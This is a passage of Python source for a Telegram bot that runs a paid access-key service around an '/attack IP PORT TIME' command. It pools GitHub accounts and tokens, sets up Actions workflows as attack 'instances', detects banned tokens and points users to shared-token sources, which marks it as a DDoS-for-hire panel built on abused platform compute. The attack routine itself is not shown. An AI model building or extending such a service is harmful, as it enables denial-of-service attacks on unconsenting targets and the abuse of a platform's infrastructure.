        if not gh_manager.setup_workflow(repo_name):
            await msg.edit_text("❌ **ADMIN: WORKFLOW SETUP FAILED!**")
            return
        
        new_account = {
            "username": gh_manager.username,
            "token": token,
            "repo_name": repo_name,
            "prefix": prefix,
            "status": "active",
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "added_by": user_id
        }
        
        bot_manager.accounts.append(new_account)
        bot_manager.save_accounts()
        
        success_text = f"""
✅ **ADMIN: ACCOUNT ADDED TO MAIN POOL!** 🎉

**👤 GitHub Account:** `{gh_manager.username}`
**📁 Repository:** `{repo_name}`
**🔧 Prefix:** `{prefix}`
**⚡ Instances:** `5`
**👥 Access:** Special Users & Admins

**📊 MAIN POOL STATISTICS:**
**🔢 Total Accounts:** `{len(bot_manager.accounts)}`
**💪 Total Instances:** `{len(bot_manager.accounts) * 5}`
**👑 Added By:** Admin `{user_id}`

**🚀 ACCOUNT READY FOR OPERATIONS!**
        """
        
        await msg.edit_text(success_text)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **ADMIN ERROR:** {str(e)}")

async def remove_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to remove account - ADMIN ONLY"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text(
            "🗑️ **ADMIN: REMOVE ACCOUNT**\n\n"
            "💡 **Usage:** `/removeaccount ACCOUNT_NUMBER`\n\n"
            "📝 **Example:**\n"
            "`/removeaccount 1` - Removes first account\n\n"
            "⚡ **Effects:**\n"
            "• Permanently removes account\n"
            "• Cannot be undone\n"
            "• Use /accounts to see numbers"
        )
        return
    
    account_number = int(context.args[0]) - 1
    
    if account_number < 0 or account_number >= len(bot_manager.accounts):
        await update.message.reply_text(
            "❌ **INVALID ACCOUNT NUMBER!**\n\n"
            f"💡 Available accounts: 1 to {len(bot_manager.accounts)}\n"
            "🔧 Use /accounts to see all accounts"
        )
        return
    
    removed_account = bot_manager.accounts.pop(account_number)
    bot_manager.save_accounts()
    
    await update.message.reply_text(
        f"✅ **ADMIN: ACCOUNT REMOVED!** 🗑️\n\n"
        f"**👤 Account:** `{removed_account['username']}`\n"
        f"**📁 Repository:** `{removed_account['repo_name']}`\n"
        f"**👑 Removed By:** Admin `{user_id}`\n"
        f"**📅 Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"**📊 Remaining Accounts:** `{len(bot_manager.accounts)}`"
    )

async def generate_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to generate access keys"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text(
            "🔑 **ADMIN KEY GENERATION:**\n\n"
            "💡 **Usage:** `/gen DAYS`\n\n"
            "📝 **Examples:**\n"
            "`/gen 1` - 1 day access\n"
            "`/gen 2` - 2 days access\n"
            "`/gen 5` - 5 days access\n\n"
            "⚡ **Features:**\n"
            "• Generates unique access key\n"
            "• Single use only\n"
            "• Auto-expires after duration"
        )
        return
    
    duration_days = int(context.args[0])
    allowed_durations = [1, 2, 5]
    
    if duration_days not in allowed_durations:
        await update.message.reply_text(
            "❌ **INVALID DURATION!**\n\n"
            "💡 **Allowed Durations:**\n"
            "• `1` day\n"
            "• `2` days\n"
            "• `5` days\n\n"
            "📝 **Example:** `/gen 5`"
        )
        return
    
    key_string = generate_key(duration_days)
    
    key_text = f"""
🔑 **ADMIN: ACCESS KEY GENERATED!** ✅

**📋 KEY DETAILS:**
**🔑 Key:** `{key_string}`
**⏰ Duration:** {duration_days} day{'s' if duration_days > 1 else ''}
**📅 Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**👑 Generated By:** Admin `{user_id}`

**💡 USAGE INSTRUCTIONS:**
1. User sends: `/use_key {key_string}`
2. Gets {duration_days} day access
3. Can add personal tokens
4. Launch operations with their tokens

**⚠️ SECURITY NOTES:**
• Single use only
• Destroy if compromised
• Monitor key usage
    """
    
    await update.message.reply_text(key_text)

async def use_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command for users to use access keys"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "🔑 **ACCESS KEY REDEMPTION**\n\n"
            "💡 **Usage:** `/use_key YOUR_ACCESS_KEY`\n\n"
            "📝 **Example:**\n"
            "`/use_key DETACUP0001234567`\n\n"
            "💎 **Benefits:**\n"
            "• Temporary bot access\n"
            "• Add personal GitHub tokens\n"
            "• Launch operations\n"
            "• Limited duration access\n\n"
            "🔗 **Get Keys:** From administrator"
        )
        return
    
    key_string = context.args[0]
    success, duration = use_key(key_string, user_id)
    
    if success:
        welcome_text = f"""
🎊 **ACCESS GRANTED!** 🎉

**👤 Welcome {user_name}!** 😊
**🔑 Access Key:** `{key_string}`
**⏰ Duration:** {duration} day{'s' if duration > 1 else ''}
**📅 Expires:** {(datetime.now() + timedelta(days=duration)).strftime('%Y-%m-%d %H:%M:%S')}

**💎 YOUR NEW PRIVILEGES:**
✅ Add personal GitHub tokens
🚀 Launch operations with your tokens
📊 View your tokens and statistics
🔧 Manage your workflows

**🔧 NEXT STEPS:**
1. Add your token: `/addtoken YOUR_TOKEN`
2. View tokens: `/mytokens`
3. Launch operation: `/attack IP PORT TIME`

**⚡ Bot Created By:** {CREATOR}
**🔥 Managed By:** {OWNER_NAME}
**👑 Owner:** @NEOBLADE71

**🎯 ENJOY YOUR ACCESS!** 🚀
        """
    else:
        welcome_text = """
❌ **INVALID OR USED KEY!** 🔒

**💡 Possible Reasons:**
• Key already used
• Invalid key format
• Key destroyed by admin
• System error

**🔧 Solutions:**
• Verify key spelling
• Contact admin for new key
• Check if key was already used

**📞 Contact Admin:** @NEOBLADE71
        """
    
    await update.message.reply_text(welcome_text)

async def destroy_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to destroy access keys"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "💥 **ADMIN KEY DESTRUCTION:**\n\n"
            "💡 **Usage:** `/destroykey KEY`\n\n"
            "📝 **Example:**\n"
            "`/destroykey DETACUP0001234567`\n\n"
            "⚡ **Effects:**\n"
            "• Immediately invalidates key\n"
            "• Cannot be used again\n"
            "• User access not affected if already used"
        )
        return
    
    key_string = context.args[0]
    
    if destroy_key(key_string):
        await update.message.reply_text(
            f"✅ **ADMIN: KEY DESTROYED!** 💥\n\n"
            f"**🔑 Key:** `{key_string}`\n"
            f"**👑 Destroyed By:** Admin `{user_id}`\n"
            f"**📅 Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"**⚠️ This key can no longer be used!**"
        )
    else:
        await update.message.reply_text(
            "❌ **ADMIN: KEY NOT FOUND!**\n\n"
            "💡 **Possible Reasons:**\n"
            "• Key doesn't exist\n"
            "• Already destroyed\n"
            "• Invalid key format\n\n"
            "🔧 **Check existing keys with:** /listkeys"
        )

async def list_keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to list all keys"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    keys = KEYS_DATA["keys"]
    
    if not keys:
        await update.message.reply_text(
            "📭 **NO KEYS GENERATED!**\n\n"
            "💡 **Generate keys with:**\n"
            "`/gen 1` - 1 day access\n"
            "`/gen 2` - 2 days access\n"
            "`/gen 5` - 5 days access"
        )
        return
    
    keys_text = "🔑 **ADMIN: ALL ACCESS KEYS** 📋\n\n"
    
    for key_string, key_data in keys.items():
        status = "🟢 ACTIVE" if key_data["active"] else "🔴 USED"
        used_by = f"User `{key_data['used_by']}`" if key_data["used_by"] else "Not used"
        
        keys_text += f"**🔑 Key:** `{key_string}`\n"
        keys_text += f"**⏰ Duration:** {key_data['duration']} days\n"
        keys_text += f"**📅 Created:** {datetime.fromtimestamp(key_data['created_at']).strftime('%Y-%m-%d %H:%M:%S')}\n"
        keys_text += f"**👤 Used By:** {used_by}\n"
        keys_text += f"**📊 Status:** {status}\n\n"
    
    keys_text += f"**🔢 Total Keys:** {len(keys)}\n"
    keys_text += "**💡 Manage with:** /destroykey KEY"
    
    await update.message.reply_text(keys_text)

async def github_cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Provide GitHub token sources"""
    cc_text = """
🌐 **GITHUB TOKEN SOURCES** 🔗

**💡 Official GitHub Token Generation:**
🔗 https://github.com/settings/tokens

**📋 Required Permissions:**
✅ repo (Full control of private repositories)
✅ workflow (Update GitHub Action workflows)
✅ read:org (Read org and team membership)

**🚀 Alternative Sources (Use at your own risk):**
• Token generation services
• GitHub development platforms
• Community token sharing

**⚠️ SECURITY WARNING:**
• Never share your tokens publicly
• Use tokens only in trusted bots
• Revoke compromised tokens immediately
• Monitor token usage regularly

**🔧 Token Format:** `ghp_XXXXXXXXXXXXXXXXXXXX`

**💎 PRO TIP:** Always verify token permissions before use!

**⚡ Bot Created By:** @NEOBLADE71 🚀
**🔥 Managed By:** @NEOBLADE71 💀
**👑 Owner:** @NEOBLADE71
    """
    
    await update.message.reply_text(cc_text)

async def fake_github_cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Provide fake GitHub token sources - ADMIN ONLY"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    fake_text = """
🌐 **FAKE GITHUB TOKEN SOURCES** 🎭

**🚨 IMPORTANT WARNING:**
❌ These are fake sources for testing only!
❌ Do not use real tokens here!
❌ For educational purposes!

**🔗 Fake Testing URLs:**
• https://fakexy.com/github-tokens
• https://test-token-generator.com
• https://dummy-github-tokens.net

**⚠️ SECURITY ALERT:**
• These are NOT real token sources
• Use only for testing and development
• Real tokens should come from official GitHub

**💡 For Real Tokens:**
Use the official `/githubcc` command

**👑 Admin Only Command**
**⚡ Managed by:** @Gx7_Admin
    """
    
    await update.message.reply_text(fake_text)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin broadcast command"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 **ADMIN BROADCAST SYSTEM**\n\n"
            "💡 **Usage:** `/broadcast YOUR_MESSAGE`\n\n"
            "📝 **Example:**\n"
            "`/broadcast Server maintenance in 10 minutes`\n\n"
            "👥 **Recipients:**\n"
            "• All admins\n"
            "• All special users\n"
            "• All token users\n\n"
            "⚡ **Features:**\n"
            "• Mass message delivery\n"
            "• Delivery reports\n"
            "• Rate limited for safety"
        )
        return
    
    message = " ".join(context.args)
    broadcast_header = f"📢 **BROADCAST FROM ADMIN** 👑\n\n{message}\n\n⚡ _Bot Managed by {OWNER_NAME}_"
    
    sending_msg = await update.message.reply_text("📢 **BROADCAST INITIATED...**\n\n🔄 Sending messages to all users...")
    
    success, total = await broadcast_message(context, broadcast_header)
    
    await sending_msg.edit_text(
        f"📢 **BROADCAST COMPLETED!** ✅\n\n"
        f"**📊 Delivery Report:**\n"
        f"**✅ Successful:** `{success}` users\n"
        f"**❌ Failed:** `{total - success}` users\n"
        f"**📨 Total Attempted:** `{total}` users\n"
        f"**📈 Success Rate:** `{(success/total)*100:.1f}%`\n\n"
        f"**👑 Broadcast by:** Admin `{user_id}`"
    )

async def contact_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Contact information"""
    contact_text = f"""
📞 **CONTACT ADMINISTRATION** 👑

**🤖 Bot Information:**
**🎯 Created By:** {CREATOR}
**🔥 Managed By:** {OWNER_NAME}
**👑 Owner:** @NEOBLADE71
**📅 Launched:** {datetime.fromtimestamp(BOT_START_TIME).strftime('%Y-%m-%d')}

**💼 Administrative Contact:**
**👤 Main Admin:** @NEOBLADE71
**📧 Email:** neoblade711@gmail.com
**🌐 Support:** Telegram Group

**🔧 SUPPORT SERVICES:**
• Access key requests
• Technical issues
• Feature suggestions
• Bug reports
• Account problems

**⚡ RESPONSE TIME:**
• Usually within 24 hours
• Priority for active users
• Emergency support available

**💎 BEFORE CONTACTING:**
1. Check /help for commands
2. Read command usage carefully
3. Ensure your issue is not covered in FAQ

**🚀 WE'RE HERE TO HELP!** 😊
    """
    
    await update.message.reply_text(contact_text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced statistics command"""
    user_id = update.effective_user.id
    
    total_main_accounts = len(bot_manager.accounts)
    total_token_users = len(TOKEN_USERS)
    total_tokens = sum(len(user_data['tokens']) for user_data in TOKEN_USERS.values())
    
    total_instances = (total_main_accounts * 5) + (total_tokens * 5)
    
    stats_text = f"""
📊 **DETACUP BOT - STATISTICS** 📈

**⚡ OPERATIONAL STATS:**
**🔧 Main Accounts:** `{total_main_accounts}`
**🔑 Token Users:** `{total_token_users}`
**📝 Total Tokens:** `{total_tokens}`
**💪 Total Instances:** `{total_instances}`

**👥 USER MANAGEMENT:**
**👑 Admins:** `{len(ADMIN_IDS)}`
**⭐ Special Users:** `{len(APPROVED_USERS)}`
**🔑 Active Token Users:** `{total_token_users}`

**🕒 SYSTEM INFORMATION:**
**⏰ Uptime:** `{int((time.time() - BOT_START_TIME) // 3600)} hours`
**📅 Started:** `{datetime.fromtimestamp(BOT_START_TIME).strftime('%Y-%m-%d %H:%M:%S')}`
**🔄 Last Update:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

**🔑 KEY SYSTEM:**
**📋 Total Keys:** `{len(KEYS_DATA['keys'])}`
**🔑 Active Keys:** `{sum(1 for k in KEYS_DATA['keys'].values() if k['active'])}`
**🔴 Used Keys:** `{sum(1 for k in KEYS_DATA['keys'].values() if not k['active'])}`
    """
    
    # Add admin-only stats
    if is_admin(user_id):
        stats_text += f"\n**👑 ADMIN STATISTICS:**"
        stats_text += f"\n**📨 Broadcast Ready:** ✅"
        stats_text += f"\n**🔧 System Health:** 🟢 EXCELLENT"
        stats_text += f"\n**💾 Memory Usage:** OPTIMAL"
    
    stats_text += f"\n\n**🎯 Bot Creator:** {CREATOR}"
    stats_text += f"\n**🔥 Bot Manager:** {OWNER_NAME}"
    stats_text += f"\n**👑 Bot Owner:** @NEOBLADE71"
    
    await update.message.reply_text(stats_text)

async def cloudways_instant_approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin instant approval system"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await send_admin_only_response(update)
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "⚡ **CLOUDWAYS INSTANT APPROVE SYSTEM** 👑\n\n"
            "💡 **Usage:** `/cloudways_instant_approve USER_ID [ACTION]`\n\n"
            "📝 **Examples:**\n"
            "`/cloudways_instant_approve 123456789` - Approve user\n"
            "`/cloudways_instant_approve 123456789 remove` - Remove approval\n"
            "`/cloudways_instant_approve check 123456789` - Check user status\n\n"
            "⚡ **Features:**\n"
            "• Instant user approval\n"
            "• Token ban detection\n"
            "• User status monitoring\n"
            "• Automatic notifications"
        )
        return
    
    if context.args[0] == "check":
        if len(context.args) < 2 or not context.args[1].isdigit():
            await update.message.reply_text("❌ **Invalid user ID for check!**")
            return
        
        target_user = int(context.args[1])
        is_approved = target_user in APPROVED_USERS
        is_token_user_flag = target_user in TOKEN_USERS
        
        status_text = f"""
🔍 **USER STATUS CHECK** 👤

**🆔 User ID:** `{target_user}`
**⭐ Special Approved:** {'✅ YES' if is_approved else '❌ NO'}
**🔑 Token User:** {'✅ YES' if is_token_user_flag else '❌ NO'}

"""
        if is_token_user_flag:
            tokens = TOKEN_USERS[target_user]['tokens']
            expiry_time = TOKEN_USERS[target_user].get('expiry_time')
            days_left = (expiry_time - time.time()) / (24 * 60 * 60) if expiry_time else 0
            
            status_text += f"**📊 Tokens:** {len(tokens)}\n"
            status_text += f"**⏰ Access Expires:** {days_left:.1f} days\n"
            
            # Check token status
            active_tokens = 0
            for token_data in tokens:
                gh_manager = GitHubManager(token_data['token'])
                if gh_manager.username != "unknown":
                    active_tokens += 1
            
            status_text += f"**🔧 Active Tokens:** {active_tokens}/{len(tokens)}\n"
            
            if active_tokens < len(tokens):
                status_text += "**🚨 Some tokens may be banned!**\n"
        
        await update.message.reply_text(status_text)
        return
    
    target_user = int(context.args[0])
    action = context.args[1] if len(context.args) > 1 else "add"
    
    if action == "add":
        if target_user not in APPROVED_USERS:
            APPROVED_USERS.append(target_user)
            save_json_file(APPROVED_USERS_FILE, {"approved_users": APPROVED_USERS})
            
            # Notify user if possible
            try:
                await context.bot.send_message(
                    chat_id=target_user,
                    text=f"🎉 **CONGRATULATIONS!** 🎊\n\n"
                         f"✅ **You have been instantly approved!** ⭐\n\n"
                         f"**💎 NEW PRIVILEGES:**\n"
                         f"• Access to main account pool\n"
                         f"• Priority operations\n"
                         f"• Extended features\n"
                         f"• Permanent access\n\n"
                         f"**🚀 Start using:** /attack\n"
                         f"**🔧 Check accounts:** /accounts\n\n"
                         f"**👑 Approved by:** Admin `{user_id}`\n"
                         f"**⚡ Bot Managed by:** {OWNER_NAME}"
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ **USER INSTANTLY APPROVED!** ⭐\n\n"
                f"**🆔 User ID:** `{target_user}`\n"
                f"**👑 Approved By:** Admin `{user_id}`\n"
                f"**📅 Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"**💎 User notified about new privileges!**"
            )
        else:
            await update.message.reply_text("ℹ️ **User is already approved!**")
    
    elif action == "remove":
        if target_user in APPROVED_USERS:
            APPROVED_USERS.remove(target_user)
            save_json_file(APPROVED_USERS_FILE, {"approved_users": APPROVED_USERS})
            
            # Notify user if possible
            try:
                await context.bot.send_message(
                    chat_id=target_user,
                    text=f"🔒 **ACCESS UPDATE** ⚠️\n\n"
                         f"❌ **Your special approval has been removed!**\n\n"
                         f"**💡 Reason:** Administrative decision\n"
                         f"**📅 Effective:** Immediately\n\n"
                         f"**🔧 Current Status:**\n"
                         f"• Special access revoked\n"
                         f"• Main accounts unavailable\n"
                         f"• Token access remains if active\n\n"
                         f"**📞 Contact admin for details:** @NEOBLADE71"
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ **USER APPROVAL REMOVED!** 🗑️\n\n"
                f"**🆔 User ID:** `{target_user}`\n"
                f"**👑 Removed By:** Admin `{user_id}`\n"
                f"**📅 Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"**⚠️ User notified about access change!**"
            )
        else:
            await update.message.reply_text("ℹ️ **User is not approved!**")

# 🚀 Main Application Setup
def main():
    """Main function to start the bot"""
    print("""
🚀 DETACUP BOT - STARTING SYSTEM...
    
⚡ Powered by Python-Telegram-Bot
🎯 Created by: @NEOBLADE71
🔥 Managed by: @NEOBLADE71
👑 Owner: @NEOBLADE71
💾 Loading configuration...
    """)
    
    # Check photo URL
    if BOT_PHOTO_URL.startswith("https://"):
        print("🖼️ Bot photo URL: CONFIGURED")
    else:
        print("⚠️ Bot photo URL not configured, using text fallback")
    
    # Display system information
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⭐ Special Users: {len(APPROVED_USERS)}")
    print(f"🔑 Token Users: {len(TOKEN_USERS)}")
    print(f"🔧 Main Accounts: {len(bot_manager.accounts)}")
    print(f"🔑 Total Keys: {len(KEYS_DATA['keys'])}")
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()

    # 🎯 Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("myaccount", myaccount))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("contact", contact_command))
    
    # 🔑 Token management
    app.add_handler(CommandHandler("addtoken", add_token))
    app.add_handler(CommandHandler("mytokens", mytokens))
    
    # 🎯 Operation commands
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("accounts", accounts))
    
    # 👑 Admin commands
    app.add_handler(CommandHandler("addaccount", add_account))
    app.add_handler(CommandHandler("removeaccount", remove_account))
    app.add_handler(CommandHandler("clear", lambda u, c: u.message.reply_text("🛠️ Command in development...")))
    app.add_handler(CommandHandler("approve", lambda u, c: u.message.reply_text("🛠️ Command in development...")))
    app.add_handler(CommandHandler("unapprove", lambda u, c: u.message.reply_text("🛠️ Command in development...")))
    app.add_handler(CommandHandler("list_approved", lambda u, c: u.message.reply_text("🛠️ Command in development...")))
    
    # 🔑 Key system
    app.add_handler(CommandHandler("gen", generate_key_command))
    app.add_handler(CommandHandler("use_key", use_key_command))
    app.add_handler(CommandHandler("destroykey", destroy_key_command))
    app.add_handler(CommandHandler("listkeys", list_keys_command))
    
    # 🌐 Other commands
    app.add_handler(CommandHandler("githubcc", github_cc_command))
    app.add_handler(CommandHandler("fakegithubcc", fake_github_cc_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("cloudways_instant_approve", cloudways_instant_approve_command))

    print("\n✅ ALL HANDLERS REGISTERED!")
    print("🚀 BOT STARTING...")
    print("⚡ DETACUP BOT IS NOW LIVE! 💀🔥")
    print("👑 OWNER: @NEOBLADE71")
    print("🤖 CREATOR: NEON AI BOT 🚀")
    
    # Start the bot
    app.run_polling()

if __name__ == "__main__":
    main()